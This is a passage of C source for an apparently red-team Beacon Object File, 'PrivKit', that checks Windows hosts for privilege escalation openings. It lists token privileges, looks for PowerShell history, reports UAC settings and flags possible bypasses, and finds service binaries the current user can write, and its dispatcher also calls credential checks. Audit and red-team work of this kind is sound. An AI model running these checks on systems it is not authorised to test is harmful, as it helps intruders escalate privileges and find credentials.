    PTOKEN_PRIVILEGES pTokenPrivs = NULL;
    DWORD dwSize = 0;
    DWORD i = 0;
    char szPrivName[256];
    DWORD dwNameSize = 0;
    BOOL bEnabled = FALSE;
    HANDLE hHeap = NULL;

    internal_printf("=== Token Privileges Check ===\n\n");

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to open process token. Error: %lu\n", dwErrorCode);
        goto TokenPrivilegesCheck_end;
    }

    ADVAPI32$GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    if (dwSize == 0)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to get token info size. Error: %lu\n", dwErrorCode);
        goto TokenPrivilegesCheck_end;
    }

    hHeap = KERNEL32$GetProcessHeap();
    pTokenPrivs = (PTOKEN_PRIVILEGES)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSize);
    if (pTokenPrivs == NULL)
    {
        dwErrorCode = ERROR_NOT_ENOUGH_MEMORY;
        internal_printf("[!] Failed to allocate memory\n");
        goto TokenPrivilegesCheck_end;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenPrivileges, pTokenPrivs, dwSize, &dwSize))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to get token privileges. Error: %lu\n", dwErrorCode);
        goto TokenPrivilegesCheck_end;
    }

    internal_printf("[*] Found %lu privileges:\n\n", pTokenPrivs->PrivilegeCount);

    for (i = 0; i < pTokenPrivs->PrivilegeCount; i++)
    {
        dwNameSize = sizeof(szPrivName);
        if (ADVAPI32$LookupPrivilegeNameA(NULL, &pTokenPrivs->Privileges[i].Luid, szPrivName, &dwNameSize))
        {
            bEnabled = (pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? TRUE : FALSE;

            if (bEnabled)
            {
                internal_printf("[+] %s : Enabled\n", szPrivName);
            }
            else
            {
                internal_printf("[-] %s : Disabled\n", szPrivName);
            }
        }
    }

    internal_printf("\n[*] Privilege enumeration complete\n");
    dwErrorCode = ERROR_SUCCESS;

TokenPrivilegesCheck_end:
    if (pTokenPrivs != NULL)
    {
        KERNEL32$HeapFree(hHeap, 0, pTokenPrivs);
        pTokenPrivs = NULL;
    }
    if (hToken != NULL)
    {
        KERNEL32$CloseHandle(hToken);
        hToken = NULL;
    }

    return dwErrorCode;
}

/* =================================================================
   9. PowerShellHistoryCheck  (original: src/PowerShellHistoryCheck)
   ================================================================= */
DWORD PowerShellHistoryCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    char szPath[MAX_PATH];
    char szAppData[MAX_PATH];
    DWORD dwSize = 0;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER liFileSize;
    int i = 0;
    int j = 0;

    const char* pszSubPath = "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";

    internal_printf("=== PowerShell History Check ===\n\n");

    dwSize = KERNEL32$GetEnvironmentVariableA("APPDATA", szAppData, sizeof(szAppData));
    if (dwSize == 0 || dwSize >= sizeof(szAppData))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to get APPDATA path. Error: %lu\n", dwErrorCode);
        goto PowerShellHistoryCheck_end;
    }

    i = 0;
    while (szAppData[i] != '\0' && i < MAX_PATH - 1)
    {
        szPath[i] = szAppData[i];
        i++;
    }

    j = 0;
    while (pszSubPath[j] != '\0' && i < MAX_PATH - 1)
    {
        szPath[i] = pszSubPath[j];
        i++;
        j++;
    }
    szPath[i] = '\0';

    hFile = KERNEL32$CreateFileA(
        szPath,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        dwErrorCode = KERNEL32$GetLastError();
        if (dwErrorCode == ERROR_FILE_NOT_FOUND || dwErrorCode == ERROR_PATH_NOT_FOUND)
        {
            internal_printf("[-] PowerShell history file not found\n");
            internal_printf("    Path: %s\n", szPath);
            dwErrorCode = ERROR_SUCCESS;
        }
        else
        {
            internal_printf("[!] Error accessing file. Error: %lu\n", dwErrorCode);
        }
        goto PowerShellHistoryCheck_end;
    }

    liFileSize.QuadPart = 0;
    if (!KERNEL32$GetFileSizeEx(hFile, &liFileSize))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to get file size. Error: %lu\n", dwErrorCode);
        goto PowerShellHistoryCheck_end;
    }

    internal_printf("[+] PowerShell history file found!\n");
    internal_printf("    Path: %s\n", szPath);

    if (liFileSize.QuadPart >= 1048576)
    {
        internal_printf("    Size: %lu MB\n", (DWORD)(liFileSize.QuadPart / 1048576));
    }
    else if (liFileSize.QuadPart >= 1024)
    {
        internal_printf("    Size: %lu KB\n", (DWORD)(liFileSize.QuadPart / 1024));
    }
    else
    {
        internal_printf("    Size: %lu bytes\n", (DWORD)liFileSize.QuadPart);
    }

    if (liFileSize.QuadPart == 0)
    {
        internal_printf("\n[-] History file is empty\n");
    }

    dwErrorCode = ERROR_SUCCESS;

PowerShellHistoryCheck_end:
    if (hFile != INVALID_HANDLE_VALUE)
    {
        KERNEL32$CloseHandle(hFile);
    }

    return dwErrorCode;
}

/* =================================================================
   10. UACStatusCheck  (original: src/UACStatusCheck)
   ================================================================= */
DWORD UACStatusCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    LONG lResult = 0;
    DWORD dwEnableLUA = 0;
    DWORD dwConsentPrompt = 0;
    DWORD dwSecureDesktop = 0;
    DWORD dwSize = sizeof(DWORD);
    DWORD dwType = 0;
    HANDLE hToken = NULL;
    DWORD dwIntegrityLevel = 0;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    PTOKEN_GROUPS pTokenGroups = NULL;
    DWORD dwLengthNeeded = 0;
    HANDLE hHeap = NULL;
    BOOL bIsAdmin = FALSE;
    BOOL bIsElevated = FALSE;
    PUCHAR pCount = NULL;
    PDWORD pLevel = NULL;
    DWORD i = 0;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID pAdminSid = NULL;

    internal_printf("=== UAC Status Check ===\n\n");

    lResult = ADVAPI32$RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0,
        KEY_READ,
        &hKey);

    if (lResult != ERROR_SUCCESS)
    {
        internal_printf("[!] Failed to open registry key. Error: %ld\n", lResult);
        dwErrorCode = (DWORD)lResult;
        goto UACStatusCheck_end;
    }

    dwSize = sizeof(DWORD);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "EnableLUA", NULL, &dwType, (LPBYTE)&dwEnableLUA, &dwSize);
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[*] UAC Enabled (EnableLUA): %s\n", dwEnableLUA ? "Yes" : "No");
    }
    else
    {
        internal_printf("[*] UAC Enabled (EnableLUA): Unknown (not found)\n");
    }

    dwSize = sizeof(DWORD);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "ConsentPromptBehaviorAdmin", NULL, &dwType, (LPBYTE)&dwConsentPrompt, &dwSize);
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[*] ConsentPromptBehaviorAdmin: %lu ", dwConsentPrompt);
        switch (dwConsentPrompt)
        {
            case 0: internal_printf("(Elevate without prompting)\n"); break;
            case 1: internal_printf("(Prompt for credentials on secure desktop)\n"); break;
            case 2: internal_printf("(Prompt for consent on secure desktop)\n"); break;
            case 3: internal_printf("(Prompt for credentials)\n"); break;
            case 4: internal_printf("(Prompt for consent)\n"); break;
            case 5: internal_printf("(Prompt for consent for non-Windows binaries)\n"); break;
            default: internal_printf("(Unknown)\n"); break;
        }
    }

    dwSize = sizeof(DWORD);
    lResult = ADVAPI32$RegQueryValueExA(hKey, "PromptOnSecureDesktop", NULL, &dwType, (LPBYTE)&dwSecureDesktop, &dwSize);
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[*] PromptOnSecureDesktop: %s\n", dwSecureDesktop ? "Yes" : "No");
    }

    ADVAPI32$RegCloseKey(hKey);
    hKey = NULL;

    internal_printf("\n");

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to open process token. Error: %lu\n", dwErrorCode);
        goto UACStatusCheck_end;
    }

    hHeap = KERNEL32$GetProcessHeap();

    ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded);
    if (dwLengthNeeded > 0)
    {
        pTIL = (PTOKEN_MANDATORY_LABEL)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwLengthNeeded);
        if (pTIL != NULL)
        {
            if (ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded))
            {
                pCount = ADVAPI32$GetSidSubAuthorityCount(pTIL->Label.Sid);
                if (pCount != NULL && *pCount > 0)
                {
                    pLevel = ADVAPI32$GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(*pCount - 1));
                    if (pLevel != NULL)
                    {
                        dwIntegrityLevel = *pLevel;
                    }
                }
            }
        }
    }

    internal_printf("[*] Integrity Level: ");
    if (dwIntegrityLevel < SECURITY_MANDATORY_LOW_RID)
    {
        internal_printf("Untrusted\n");
    }
    else if (dwIntegrityLevel < SECURITY_MANDATORY_MEDIUM_RID)
    {
        internal_printf("Low\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
    {
        internal_printf("Medium\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID && dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
    {
        internal_printf("High (Elevated)\n");
        bIsElevated = TRUE;
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
    {
        internal_printf("System\n");
        bIsElevated = TRUE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(
            &NtAuthority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0,
            &pAdminSid))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to create Admin SID. Error: %lu\n", dwErrorCode);
        goto UACStatusCheck_end;
    }

    dwLengthNeeded = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwLengthNeeded);
    if (dwLengthNeeded > 0)
    {
        pTokenGroups = (PTOKEN_GROUPS)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwLengthNeeded);
        if (pTokenGroups != NULL)
        {
            if (ADVAPI32$GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLengthNeeded, &dwLengthNeeded))
            {
                for (i = 0; i < pTokenGroups->GroupCount; i++)
                {
                    if (ADVAPI32$EqualSid(pAdminSid, pTokenGroups->Groups[i].Sid))
                    {
                        bIsAdmin = TRUE;
                        break;
                    }
                }
            }
        }
    }

    internal_printf("[*] Local Admin Group Member: %s\n", bIsAdmin ? "Yes" : "No");

    internal_printf("\n[*] Summary:\n");

    if (bIsElevated)
    {
        internal_printf("[+] Process is running with elevated privileges\n");
    }
    else if (bIsAdmin && dwEnableLUA)
    {
        internal_printf("[+] User is local admin but NOT elevated (UAC filtered token)\n");
        internal_printf("[+] UAC bypass may be possible\n");
    }
    else if (bIsAdmin && !dwEnableLUA)
    {
        internal_printf("[+] User is local admin and UAC is disabled\n");
    }
    else
    {
        internal_printf("[-] User is NOT a local admin\n");
    }

    dwErrorCode = ERROR_SUCCESS;

UACStatusCheck_end:
    if (pAdminSid != NULL)
    {
        ADVAPI32$FreeSid(pAdminSid);
    }
    if (pTokenGroups != NULL)
    {
        KERNEL32$HeapFree(hHeap, 0, pTokenGroups);
    }
    if (pTIL != NULL)
    {
        KERNEL32$HeapFree(hHeap, 0, pTIL);
    }
    if (hToken != NULL)
    {
        KERNEL32$CloseHandle(hToken);
    }
    if (hKey != NULL)
    {
        ADVAPI32$RegCloseKey(hKey);
    }

    return dwErrorCode;
}

/* =================================================================
   11. WritableSVCBinaryCheck  (check file DACL on service binaries)
   Uses DACL analysis instead of CreateFileA so it works even when
   the service binary is loaded/running (Windows locks mapped images
   against GENERIC_WRITE handles).
   ================================================================= */
BOOL HasFileWriteRights(ACCESS_MASK mask)
{
    if (mask & FILE_WRITE_DATA)     return TRUE;
    if (mask & FILE_APPEND_DATA)    return TRUE;
    if (mask & GENERIC_WRITE)       return TRUE;
    if (mask & GENERIC_ALL)         return TRUE;
    if (mask & WRITE_DAC)           return TRUE;
    if (mask & WRITE_OWNER)         return TRUE;
    return FALSE;
}

DWORD WritableSVCBinaryCheck(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    HANDLE hToken = NULL;
    HANDLE hHeap = NULL;
    LPBYTE pServices = NULL;
    LPENUM_SERVICE_STATUS_PROCESSA pServiceStatus = NULL;
    LPQUERY_SERVICE_CONFIGA pConfig = NULL;
    PTOKEN_USER pTokenUser = NULL;
    PSECURITY_DESCRIPTOR pFileSD = NULL;
    DWORD dwBytesNeeded = 0;
    DWORD dwServicesReturned = 0;
    DWORD dwResumeHandle = 0;
    DWORD dwBufferSize = 0;
    DWORD dwConfigSize = 0;
    DWORD dwTokenInfoSize = 0;
    DWORD dwSDSize = 0;
    DWORD i = 0;
    DWORD j = 0;
    int nVulnerable = 0;
    char szBinPath[512];
    int p, q;
    BOOL bDaclPresent = FALSE;
    BOOL bDaclDefaulted = FALSE;
    PACL pDacl = NULL;
    PACE_HEADER pAceHeader = NULL;
    PACCESS_ALLOWED_ACE pAce = NULL;
    PSID pAceSid = NULL;

    hHeap = KERNEL32$GetProcessHeap();

    internal_printf("=== Writable Service Binary Check ===\n\n");

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to open process token. Error: %lu\n", dwErrorCode);
        goto WritableSVCBinaryCheck_end;
    }

    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwTokenInfoSize);
    pTokenUser = (PTOKEN_USER)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwTokenInfoSize);
    if (pTokenUser == NULL)
    {
        dwErrorCode = ERROR_NOT_ENOUGH_MEMORY;
        internal_printf("[!] Failed to allocate memory for token user\n");
        goto WritableSVCBinaryCheck_end;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, dwTokenInfoSize, &dwTokenInfoSize))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to get token user. Error: %lu\n", dwErrorCode);
        goto WritableSVCBinaryCheck_end;
    }

    hSCManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == NULL)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to open Service Control Manager. Error: %lu\n", dwErrorCode);
        goto WritableSVCBinaryCheck_end;
    }

    ADVAPI32$EnumServicesStatusExA(
        hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, NULL, 0, &dwBytesNeeded,
        &dwServicesReturned, &dwResumeHandle, NULL);

    dwBufferSize = dwBytesNeeded;
    pServices = (LPBYTE)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
    if (pServices == NULL)
    {
        dwErrorCode = ERROR_NOT_ENOUGH_MEMORY;
        internal_printf("[!] Failed to allocate memory for services\n");
        goto WritableSVCBinaryCheck_end;
    }

    dwResumeHandle = 0;
    if (!ADVAPI32$EnumServicesStatusExA(
        hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32,
        SERVICE_STATE_ALL, pServices, dwBufferSize, &dwBytesNeeded,
        &dwServicesReturned, &dwResumeHandle, NULL))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("[!] Failed to enumerate services. Error: %lu\n", dwErrorCode);
        goto WritableSVCBinaryCheck_end;
    }

    internal_printf("[*] Checking %lu service binaries for write access...\n\n", dwServicesReturned);

    pServiceStatus = (LPENUM_SERVICE_STATUS_PROCESSA)pServices;

    for (i = 0; i < dwServicesReturned; i++)
    {
        hService = ADVAPI32$OpenServiceA(hSCManager, pServiceStatus[i].lpServiceName, SERVICE_QUERY_CONFIG);
        if (hService == NULL)
            continue;

        dwConfigSize = 0;
        ADVAPI32$QueryServiceConfigA(hService, NULL, 0, &dwConfigSize);
        if (dwConfigSize == 0)
        {
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        pConfig = (LPQUERY_SERVICE_CONFIGA)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwConfigSize);
        if (pConfig == NULL)
        {
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        if (!ADVAPI32$QueryServiceConfigA(hService, pConfig, dwConfigSize, &dwConfigSize))
        {
            KERNEL32$HeapFree(hHeap, 0, pConfig);
            pConfig = NULL;
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        if (pConfig->lpBinaryPathName == NULL || pConfig->lpBinaryPathName[0] == '\0')
        {
            KERNEL32$HeapFree(hHeap, 0, pConfig);
            pConfig = NULL;
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        p = 0; q = 0;
        while (pConfig->lpBinaryPathName[p] == ' ') p++;

        if (pConfig->lpBinaryPathName[p] == '"')
        {
            p++;
            while (pConfig->lpBinaryPathName[p] != '\0' &&
                   pConfig->lpBinaryPathName[p] != '"' && q < 510)
            {
                szBinPath[q++] = pConfig->lpBinaryPathName[p++];
            }
        }
        else
        {
            while (pConfig->lpBinaryPathName[p] != '\0' && q < 510)
            {
                szBinPath[q++] = pConfig->lpBinaryPathName[p++];
                if (q >= 4)
                {
                    char e1 = szBinPath[q-4]; char e2 = szBinPath[q-3];
                    char e3 = szBinPath[q-2]; char e4 = szBinPath[q-1];
                    if (e1 >= 'A' && e1 <= 'Z') e1 += 32;
                    if (e2 >= 'A' && e2 <= 'Z') e2 += 32;
                    if (e3 >= 'A' && e3 <= 'Z') e3 += 32;
                    if (e4 >= 'A' && e4 <= 'Z') e4 += 32;
                    if (e1 == '.' && e2 == 'e' && e3 == 'x' && e4 == 'e')
                        break;
                }
            }
        }
        szBinPath[q] = '\0';

        if (q == 0)
        {
            KERNEL32$HeapFree(hHeap, 0, pConfig);
            pConfig = NULL;
            ADVAPI32$CloseServiceHandle(hService);
            hService = NULL;
            continue;
        }

        dwSDSize = 0;
        ADVAPI32$GetFileSecurityA(szBinPath, DACL_SECURITY_INFORMATION, NULL, 0, &dwSDSize);
        if (dwSDSize > 0)
        {
            pFileSD = (PSECURITY_DESCRIPTOR)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSDSize);
            if (pFileSD != NULL)
            {
                if (ADVAPI32$GetFileSecurityA(szBinPath, DACL_SECURITY_INFORMATION, pFileSD, dwSDSize, &dwSDSize))
                {
                    pDacl = NULL;
                    bDaclPresent = FALSE;
                    bDaclDefaulted = FALSE;
                    if (ADVAPI32$GetSecurityDescriptorDacl(pFileSD, &bDaclPresent, &pDacl, &bDaclDefaulted))
                    {
                        /* NULL DACL (present but pointer NULL) grants everyone all access. */
                        if (bDaclPresent && pDacl == NULL)
                        {
                            internal_printf("[+] WRITABLE (NULL DACL): %s\n", pServiceStatus[i].lpServiceName);
                            internal_printf("    Binary: %s\n", szBinPath);
                            internal_printf("    Display: %s\n", pConfig->lpDisplayName ? pConfig->lpDisplayName : "N/A");
                            internal_printf("    State:  %s\n", GetServiceState(pServiceStatus[i].ServiceStatusProcess.dwCurrentState));
                            internal_printf("    Start:  %s\n\n", GetStartType(pConfig->dwStartType));
                            nVulnerable++;
                        }
                        else if (bDaclPresent && pDacl != NULL)
                        {
                            /* First pass: honor explicit deny ACEs for the token. */
                            BOOL bDenied = FALSE;
                            for (j = 0; j < pDacl->AceCount; j++)
                            {
                                if (!ADVAPI32$GetAce(pDacl, j, (LPVOID*)&pAceHeader))
                                    continue;
                                if (pAceHeader->AceType != ACCESS_DENIED_ACE_TYPE)
                                    continue;

                                pAce = (PACCESS_ALLOWED_ACE)pAceHeader;
                                pAceSid = (PSID)&pAce->SidStart;

                                if (!HasFileWriteRights(pAce->Mask))
                                    continue;

                                if (ADVAPI32$EqualSid(pAceSid, pTokenUser->User.Sid) ||
                                    CheckSidInToken(hToken, pAceSid))
                                {
                                    bDenied = TRUE;
                                    break;
                                }
                            }

                            if (!bDenied)
                            {
                                for (j = 0; j < pDacl->AceCount; j++)
                                {
                                    if (!ADVAPI32$GetAce(pDacl, j, (LPVOID*)&pAceHeader))
                                        continue;
                                    if (pAceHeader->AceType != ACCESS_ALLOWED_ACE_TYPE)
                                        continue;

                                    pAce = (PACCESS_ALLOWED_ACE)pAceHeader;
                                    pAceSid = (PSID)&pAce->SidStart;

                                    if (!HasFileWriteRights(pAce->Mask))
                                        continue;

                                    if (ADVAPI32$EqualSid(pAceSid, pTokenUser->User.Sid) ||
                                        CheckSidInToken(hToken, pAceSid))
                                    {
                                        internal_printf("[+] WRITABLE: %s\n", pServiceStatus[i].lpServiceName);
                                        internal_printf("    Binary: %s\n", szBinPath);
                                        internal_printf("    Display: %s\n", pConfig->lpDisplayName ? pConfig->lpDisplayName : "N/A");
                                        internal_printf("    State:  %s\n", GetServiceState(pServiceStatus[i].ServiceStatusProcess.dwCurrentState));
                                        internal_printf("    Start:  %s\n\n", GetStartType(pConfig->dwStartType));
                                        nVulnerable++;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
                KERNEL32$HeapFree(hHeap, 0, pFileSD);
                pFileSD = NULL;
            }
        }

        KERNEL32$HeapFree(hHeap, 0, pConfig);
        pConfig = NULL;
        ADVAPI32$CloseServiceHandle(hService);
        hService = NULL;
    }

    if (nVulnerable > 0)
    {
        internal_printf("[+] VULNERABLE: %d writable service binary/binaries found!\n", nVulnerable);
    }
    else
    {
        internal_printf("[-] No writable service binaries found\n");
    }

    dwErrorCode = ERROR_SUCCESS;

WritableSVCBinaryCheck_end:
    if (pFileSD != NULL)
        KERNEL32$HeapFree(hHeap, 0, pFileSD);
    if (pConfig != NULL)
        KERNEL32$HeapFree(hHeap, 0, pConfig);
    if (pServices != NULL)
        KERNEL32$HeapFree(hHeap, 0, pServices);
    if (pTokenUser != NULL)
        KERNEL32$HeapFree(hHeap, 0, pTokenUser);
    if (hService != NULL)
        ADVAPI32$CloseServiceHandle(hService);
    if (hSCManager != NULL)
        ADVAPI32$CloseServiceHandle(hSCManager);
    if (hToken != NULL)
        KERNEL32$CloseHandle(hToken);

    return dwErrorCode;
}

/* =================================================================
   BOF Entry Point
   arg: 0=all, 1-11=individual check
   ================================================================= */
#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    datap parser;
    int   check = 0;

    BeaconDataParse(&parser, Buffer, Length);
    check = BeaconDataInt(&parser);

    if (!bofstart())
    {
        return;
    }

    if (check == 0)
        internal_printf("========== PrivKit — All Checks ==========\n\n");

    if (check == 0 || check == 1)
    {
        internal_printf("=== AlwaysInstallElevated Check ===\n\n");
        CheckAlwaysInstallElevated();
        internal_printf("\n");
    }
    if (check == 0 || check == 2)
    {
        UnquotedSVCPathCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 3)
    {
        ModifiableSVCCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 4)
    {
        internal_printf("=== Autologon Credentials Check ===\n\n");
        CheckAutologonCredentials();
        internal_printf("\n");
    }
    if (check == 0 || check == 5)
    {
        CredentialManagerCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 6)
    {
        HijackablePathCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 7)
    {
        ModifiableAutorunCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 8)
    {
        TokenPrivilegesCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 9)
    {
        PowerShellHistoryCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 10)
    {
        UACStatusCheck();
        internal_printf("\n");
    }
    if (check == 0 || check == 11)
    {
        WritableSVCBinaryCheck();
        internal_printf("\n");
    }

    if (check == 0)
        internal_printf("\n========== PrivKit Complete ==========\n");

    printoutput(TRUE);
    bofstop();
}
#endif
